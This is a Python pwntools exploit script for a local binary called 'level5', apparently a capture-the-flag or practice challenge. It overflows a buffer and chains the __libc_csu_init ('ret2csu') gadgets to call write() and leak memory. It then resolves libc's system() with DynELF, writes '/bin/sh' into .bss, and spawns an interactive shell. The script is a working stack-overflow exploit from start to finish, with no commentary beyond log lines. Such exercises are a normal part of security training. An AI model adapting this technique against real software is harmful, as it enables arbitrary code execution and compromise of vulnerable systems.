#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
p = process('./level5')
elf = ELF('./level5')
bss_addr = elf.bss()
write_got = elf.got['write']
read_got = elf.got['read']
main_addr = elf.symbols['main']
log.success('bss_addr = ' + hex(bss_addr))
log.success('write_got = ' + hex(write_got))
log.success('read_got = ' + hex(read_got))
log.success('main_addr = ' + hex(main_addr))

#  4005f0:       4c 89 fa                mov    rdx,r15
#  4005f3:       4c 89 f6                mov    rsi,r14
#  4005f6:       44 89 ef                mov    edi,r13d
#  4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
#  4005fd:       48 83 c3 01             add    rbx,0x1
#  400601:       48 39 eb                cmp    rbx,rbp
#  400604:       75 ea                   jne    4005f0 <__libc_csu_init+0x50>
#  400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]
#  40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]
#  400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]
#  400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]
#  40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]
#  40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]
#  400624:       48 83 c4 38             add    rsp,0x38
#  400628:       c3                      ret
def csu(rbx, rbp, r12, r13, r14, r15, ret_addr):
	payload = flat(['\x00' * 136, 0x400606, 0, rbx, rbp, r12, r13, r14, r15, 0x4005f0, '\x00' * 56, ret_addr])
	# print repr(payload)
	p.recvuntil('Hello, World\n')
	p.send(payload)

def leak(address):
	csu(0, 1, write_got, 1, address, 8, main_addr)
	data = p.recv(8)
	return data

# leak libc
log.info('>>> LEAK libc <<<')
dynelf = DynELF(leak, elf=elf)
system_addr = dynelf.lookup('system', 'libc')
log.success('system_addr = ' + hex(system_addr))
# write system("/bin/sh")
log.info('>>> WRITE system("/bin/sh") <<<')
csu(0, 1, read_got, 0, bss_addr, 16, main_addr)
payload = flat([system_addr, '/bin/sh\x00'])
p.send(payload)
# execute system("/bin/sh")
log.info('>>> EXECUTE system("/bin/sh") <<<')
csu(0, 1, bss_addr, bss_addr + 8, 0, 0, main_addr)
p.interactive()
